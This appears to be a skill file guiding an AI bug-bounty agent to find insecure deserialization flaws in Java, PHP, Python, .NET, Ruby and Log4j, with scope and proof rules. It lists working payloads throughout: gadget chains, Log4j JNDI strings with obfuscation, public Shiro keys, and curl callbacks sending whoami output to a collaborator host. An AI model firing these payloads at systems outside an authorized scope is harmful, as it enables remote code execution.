---
name: hunt-deserialization
description: Hunt Insecure Deserialization — Java gadget chains (ysoserial), PHP object injection (phpggc), Python pickle RCE, .NET BinaryFormatter, Ruby Marshal.load, JNDI/Log4Shell. URLDNS or a JNDI lookup is not RCE until a command callback lands. Use when target runs Java, PHP serialization, Python pickle, .NET, or Ruby on Rails.
sources: hackerone_public
report_count: 22
---

# HUNT-DESERIALIZATION — Untrusted object decode

The server turns bytes you control into objects. Impact depends on the gadget that actually runs. A changed error, a `rememberMe` cookie, or a DNS lookup from `URLDNS` proves **decode or JNDI lookup**, not code execution. Claim the step you reached.

## Rails
- In-scope only. One callback or one `id`.
- No exploit-kit spray, no gadget brute force, no hashcat on ViewState/Shiro keys, no webshell.
- Do not enable remote class loading, do not load a JAR, do not `MODULE LOAD`.
- Known **default** product keys (the two public Shiro sample keys below) are a single test each, not a wordlist.
- Stop at draft. Never auto-submit.
- After JDK 8u191 / 11.0.1, a remote JNDI codebase is off by default. An LDAP lookup is not automatically RCE.

## Decision tree

1. **Identify the format** from the bytes, not the framework logo.

   | Magic / shape | Format |
   |---|---|
   | `AC ED 00 05` or base64 `rO0AB` | Java serialization |
   | `Content-Type: application/x-java-serialized-object`, `/invoker/`, `/wls-wsat/`, `/jmx-console/` | Java gadget sink |
   | Cookie `rememberMe=` (Shiro) | AES-wrapped Java serialization |
   | `O:<len>:"Class"` / `a:` / `C:` | PHP `unserialize` or `phar` metadata |
   | `\x80\x02`–`\x80\x05` or base64 `gASV` | Python pickle |
   | YAML `!!python/object` or `!!javax.script` | Unsafe YAML |
   | JSON `"@type"` / `["com.sun....", {` | Fastjson / Jackson default typing |
   | `\x04\x08` | Ruby Marshal |
   | `__VIEWSTATE` | .NET ViewState (LosFormatter / ObjectStateFormatter) |
   | JSON `"$type"` | Newtonsoft.Json `TypeNameHandling` (not `None`) |
   | `Content-Type: application/x-hessian` or `x-application/hessian`, Dubbo body | Hessian. One callback, then one gadget that matches a library you saw |
   | XML the error names as XStream, or `com.thoughtworks.xstream` | XStream. One callback. Do not paste a long gadget chain |
   | `${jndi:` in a field that is logged | Log4j lookup — not Java serialization, same proof rules |

2. **Benign confirmation first.**
   - Java: `ysoserial URLDNS http://UNIQUE.collab/` — DNS hit means the bytes were deserialized. No library dependency. **Not RCE.**
   - Fastjson: `{"@type":"java.net.Inet4Address","val":"UNIQUE.collab"}` — DNS means autoType/lookup. **Not RCE.**
   - PHP: only a side effect counts (OOB from a real POP chain, or a property that changes a later response). A 500 on a truncated `O:` string does not.
   - Pickle / Marshal / BinaryFormatter: go straight to a single OOB gadget; there is no safe "half" execute.
   - ViewState: flip one byte. If the app still accepts it, MAC is off. If it 500s with a MAC error, stop unless you already **read** the machineKey from a file (`hunt-lfi`). Do not crack the key.
3. **Code execution, one gadget that matches what you know is loaded.**
   - Java commons-collections 3.1 → `CommonsCollections6`; 4.x → `CommonsCollections2`; Spring on the classpath → `Spring1`; otherwise stop after URLDNS and say which libraries you actually saw (JAR name, error class).
   - PHP → `phpggc` for the framework the error traces name (Laravel, Symfony, Monolog, Guzzle, Magento). Current chains, not a 2016 `__wakeup` copied from a blog. Command: `curl http://UNIQUE.collab/$(whoami)`.
   - Python pickle `__reduce__` → `os.system` or `curl`. Same sink when `torch.load`, `joblib.load`, or `numpy.load(..., allow_pickle=True)` accepts your bytes. PyYAML 6+: `yaml.load` without a Loader raises — the sink is `unsafe_load` / `load(..., Loader=Loader)` / `FullLoader` on 5.1–5.4. Payload: `!!python/object/apply:os.system ["curl http://UNIQUE.collab/"]`. SnakeYAML 2.0+ `new Yaml()` does **not** honor global tags (`!!javax.script` is a miss) unless they pass a custom `Constructor`. Older SnakeYAML: a `!!javax.script.ScriptEngineManager` URL fetch is the lookup; a command callback is RCE. js-yaml 3 `load` (not `safeLoad`) runs `!!js/function`; js-yaml 4 `load` does not — match the lockfile.
   - Ruby: `Gem::Requirement` / `Gem::Installer` only if the callback fires. On Ruby 3.1+ (Psych 4) `YAML.load` is safe; the sinks are `YAML.unsafe_load`, older `Psych.load`, and `Marshal.load`.
   - .NET: `ysoserial.net` `TypeConfuseDelegate` only with a **disabled MAC** or a key you read from config. Newtonsoft `$type` only when config or the error shows `TypeNameHandling` other than `None`. One `curl`. BinaryFormatter: off by default on .NET 5–7, throws on .NET 8 unless `EnableUnsafeBinaryFormatterSerialization` is set, **removed** in .NET 9. A missing formatter is not a bug.
   - Node `node-serialize`: `{"rce":"_$$ND_FUNC$$_function (){require('child_process').execSync('curl http://UNIQUE.collab/'+process.env.USER)}()"}`.
   - Jackson default typing: `JdbcRowSetImpl` with `dataSourceName: ldap://UNIQUE.collab/a` and `autoCommit: true`. LDAP hit = gadget ran. RCE only if you also get command evidence and the JDK still loads remote code, or a local gadget returns output.
4. **Log4j.** `${jndi:dns://UNIQUE.collab/a}` on one user-controlled field that is likely logged (User-Agent, username, a search box). DNS = lookup works. `${jndi:ldap://...}` follow-up fetch = JNDI client. Command callback = RCE. Obfuscation when the literal is stripped: `${${lower:j}ndi:${lower:d}ns://UNIQUE.collab/a}`. On JDKs past 8u191/11.0.1 the remote codebase is ignored, so the working weaponization is a **local factory**: your LDAP server returns a reference naming a factory class already on the target's classpath (Tomcat `org.apache.naming.factory.BeanFactory` feeding `javax.el.ELProcessor`, or Groovy's `GroovyClassLoader`) instead of a remote codebase. Same proof bar — a command callback, not the LDAP fetch. Remote `${jndi:}` in a log message applies through 2.14.1, is incomplete in 2.15.0, and is removed in 2.16.0 (Java 8), 2.12.2 (Java 7), and 2.3.1 (Java 6). 2.17.0 fixed a self-referential lookup DoS, not a new RCE. 2.17.1 / 2.12.4 / 2.3.2 fixed a JDBC appender that needs control of the logging config. Do not claim RCE from DNS alone.
5. **Shiro.** One request with the public default key `kPH+bIxk5D2deZiIxcaaaA==` (CVE-2016-4437) wrapping a URLDNS or a curl gadget. If that key does not decode the cookie, try the other sample key `4AvVhmFLUs0KTA3Kprsdag==` once. If neither decodes, stop. Do not run a key list.

## Validation
| Evidence | Claim |
|---|---|
| DNS from URLDNS / Inet4Address / `${jndi:dns}` | Deserialization or JNDI lookup. Not RCE |
| LDAP/HTTP fetch of your reference | JNDI/gadget started. Not RCE unless the next row is true |
| HTTP callback path contains `whoami`/`uid`, or body prints it | RCE as that user |
| ViewState byte flip accepted | MAC disabled. RCE only after a forged payload runs |
| PHP 500 on bad `O:` | Nothing |

Repeat a flaky callback once with a new unique host. Timing side channels need n≥10; prefer the DNS proof.

## Chains
- LFI/XXE of `web.config` or `application.yml` yields a key → then, and only then, forge ViewState or a signed token. One command.
- `phar://` on a file you uploaded → PHP unserialize of metadata. Same POP rules.
- SQLi `INTO OUTFILE` or upload of a serialized blob that a worker unpickles later (second order). Trigger the worker once.
- SSRF to a loopback Java invoker or Jenkins CLI. One gadget.
- Prototype pollution is not deserialization; if the sink is `child_process`, prove it under `hunt-rce`.

## Before you report — dedup gate

Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:

```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```

`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
